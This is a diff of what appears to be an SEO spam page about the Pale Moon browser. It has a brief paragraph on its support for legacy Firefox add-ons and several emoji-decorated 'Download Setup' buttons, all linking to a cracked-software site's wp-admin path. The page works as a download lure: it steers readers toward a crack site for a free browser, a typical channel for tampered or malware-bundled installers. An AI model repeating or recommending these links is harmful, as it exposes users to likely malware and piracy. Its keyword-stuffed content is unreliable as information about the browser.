@@ -2,8 +2,7 @@
 
 Archived versions - System Requirements - Release NotesThe second feature that makes Pale Moon so popular is the fact that it still supports various old Firefox add-ons (most of which are no longer supported by the newer version of Firefox, and had to be built from the ground up to make them work). To be more precise, it offers support for XUL, XPCOM, and NPAPI plugins, the so-called “legacy” Firefox extensions.
 
-
-##[✔🎉🚀Download Setup](https://portablecrack.co/wp-admin/)
+## [✔🎉🚀Download Setup](https://portablecrack.co/wp-admin/)
 
 ## [✔🎉🚀Download Updated Link](https://portablecrack.co/wp-admin/)
 
@@ -26,4 +25,3 @@ Pale Moon browser review
 Pale Moon browser Android
 
 ## [✔🎉🚀Thanks For Downloading👍🥰](https://portablecrack.co/wp-admin/)
-
